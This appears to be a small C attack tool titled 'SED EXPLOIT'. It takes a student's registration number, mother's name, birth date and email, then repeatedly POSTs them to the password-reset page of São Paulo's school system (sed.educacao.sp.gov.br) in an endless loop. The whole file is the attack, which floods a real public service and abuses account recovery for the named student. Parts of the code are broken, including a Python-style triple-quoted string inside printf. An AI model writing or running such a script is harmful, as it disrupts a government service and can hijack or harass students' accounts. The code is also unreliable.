#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

void limpa() {
    system("clear");
}

int main() {
    limpa();

    printf("""
=~=~=~=~=~=~=~=~=~=~=~=~
=~    SED EXPLOIT     ~=
=~=~=~=~=~=~=~=~=~=~=~=~
            by gt9 and Zeld1$
""");

    char Numero[10];
    char Digito[10];
    char UF[10];
    char NomeDaMae[50];
    char DataNascimento[10];
    char Email[50];

    printf("RA: ");
    fgets(Numero, 10, stdin);
    Numero[strcspn(Numero, "\n")] = 0;

    printf("digito: ");
    fgets(Digito, 10, stdin);
    Digito[strcspn(Digito, "\n")] = 0;

    printf("uf: ");
    fgets(UF, 10, stdin);
    UF[strcspn(UF, "\n")] = 0;

    printf("Mae: ");
    fgets(NomeDaMae, 50, stdin);
    NomeDaMae[strcspn(NomeDaMae, "\n")] = 0;

    printf("data: ");
    fgets(DataNascimento, 10, stdin);
    DataNascimento[strcspn(DataNascimento, "\n")] = 0;

    printf("Email: ");
    fgets(Email, 50, stdin);
    Email[strcspn(Email, "\n")] = 0;

    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    while(1) {
        char *payload = malloc(strlen(Numero) + strlen(Digito) + strlen(UF) + strlen(NomeDaMae) + strlen(DataNascimento) + strlen(Email) + 100);
        sprintf(payload, "ra=%s&digito=%s&uf=%s&mae=%s&data=%s&email=%s", Numero, Digito, UF, NomeDaMae, DataNascimento, Email);

        curl_easy_setopt(curl, CURLOPT_URL, "https://sed.educacao.sp.gov.br/esqueci-a-senha");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "cURL error: %s\n", curl_easy_strerror(res));
        } else {
            long status_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);
            printf("Status code: %ld\n", status_code);
        }

        free(payload);
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}
